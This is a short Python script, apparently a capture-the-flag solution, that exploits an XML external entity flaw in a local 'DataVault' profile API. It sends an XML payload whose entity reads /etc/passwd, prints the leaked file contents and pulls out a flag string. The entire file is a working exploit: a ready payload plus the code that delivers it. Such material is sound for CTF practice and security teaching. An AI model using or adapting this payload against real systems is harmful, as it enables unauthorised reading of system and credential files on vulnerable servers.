#!/usr/bin/env python3
"""
DataVault XXE Exploit
Reads /etc/passwd via Content-Type switch to XML
"""
import requests

BASE = "http://localhost:8080/api/profile"

xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<profile>
  <name>pwned</name>
  <bio>&xxe;</bio>
</profile>
"""

headers = {"Content-Type": "application/xml"}

def run():
    print("[*] Sending XXE payload...")
    r = requests.post(BASE, data=xml_payload.encode("utf-8"), headers=headers, timeout=10)
    print(f"[*] HTTP {r.status_code}")
    
    try:
        js = r.json()
        bio = js.get("received", {}).get("bio", "")
        print("\n=== /etc/passwd ===\n")
        print(bio)
        
        # Extract flag
        for line in bio.split('\n'):
            if 'flag{' in line:
                flag = line.split(':')[4] if ':' in line else line
                print(f"\n[+] FLAG: {flag}")
                break
    except Exception as e:
        print(f"[!] Error: {e}")
        print(r.text)

if __name__ == "__main__":
    run()
